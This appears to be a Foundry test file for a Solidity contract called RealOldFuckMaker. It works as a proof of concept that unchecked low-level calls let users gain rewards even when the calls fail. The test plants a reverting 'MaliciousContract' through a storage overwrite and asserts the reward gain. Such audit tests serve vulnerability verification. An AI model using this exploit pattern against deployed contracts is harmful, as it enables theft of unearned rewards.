// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf2570186500a46986f3139f65afedc2afe4f445d.sol";

contract RealOldFuckMakerTest is Test {
    RealOldFuckMaker fuckMaker;
    address maliciousContract;

    function setUp() public {
        fuckMaker = new RealOldFuckMaker();
        
        // Deploy a malicious contract that will fail the low-level call
        maliciousContract = address(new MaliciousContract());
        
        // Set the malicious contract as the target for calls
        vm.store(
            address(fuckMaker),
            bytes32(uint256(0)), // Assuming 'fuck' is the first storage slot
            bytes32(uint256(uint160(maliciousContract)))
        );
    }

    function testUncheckedLowLevelCall() public {
        // Record initial state
        uint256 initialTotalFucksMade = fuckMaker.totalFucksMade();
        uint256 initialTotalRewards = fuckMaker.totalRewards();
        (uint256 initialUserFucks, uint256 initialUserRewards) = fuckMaker.getUserStats(address(this));
        
        console.log("--- BEFORE-Trigger State ---");
        console.log("Initial totalFucksMade: %s", initialTotalFucksMade);
        console.log("Initial totalRewards: %s", initialTotalRewards);
        console.log("Initial userFucks: %s", initialUserFucks);
        console.log("Initial userRewards: %s", initialUserRewards);
        
        console.log("--- Trigger Operation ---");
        console.log("Calling makeOldFucks(3)");
        // Make calls that will fail but still increment counters
        vm.prank(address(this));
        fuckMaker.makeOldFucks(3); // Make 3 calls that will fail
        
        // Record final state
        uint256 finalTotalFucksMade = fuckMaker.totalFucksMade();
        uint256 finalTotalRewards = fuckMaker.totalRewards();
        (uint256 finalUserFucks, uint256 finalUserRewards) = fuckMaker.getUserStats(address(this));
        
        console.log("--- AFTER-Trigger State ---");
        console.log("Final totalFucksMade: %s", finalTotalFucksMade);
        console.log("Final totalRewards: %s", finalTotalRewards);
        console.log("Final userFucks: %s", finalUserFucks);
        console.log("Final userRewards: %s", finalUserRewards);
        
        // Verify that fucksMade increased (expected behavior)
        assertEq(finalTotalFucksMade, initialTotalFucksMade + 3, "totalFucksMade should increment by 3");
        assertEq(finalUserFucks, initialUserFucks + 3, "userFucks should increment by 3");
        
        // Vulnerability verification: check if rewards increased despite failed calls
        uint256 userRewardsIncrease = finalUserRewards - initialUserRewards;
        
        console.log("--- Verification ---");
        console.log("User rewards increase: %s", userRewardsIncrease);
        console.log("Expected vulnerability outcome: user rewards increase by 3");

        if (userRewardsIncrease == 3) {
            console.log("Vulnerability Exists: User rewards increased by 3 despite failed calls");
        } else {
            console.log("Vulnerability not Exist: User rewards did not change as expected");
        }
        
        // Verify vulnerability - rewards should be increased due to exploit
        assertEq(finalUserRewards, initialUserRewards + 3, "Vulnerability not triggered: User rewards should have increased by 3");
    }
}

contract MaliciousContract {
    // This contract will intentionally fail the low-level call
    function giveBlockReward() external pure {
        revert("Intentional failure");
    }
}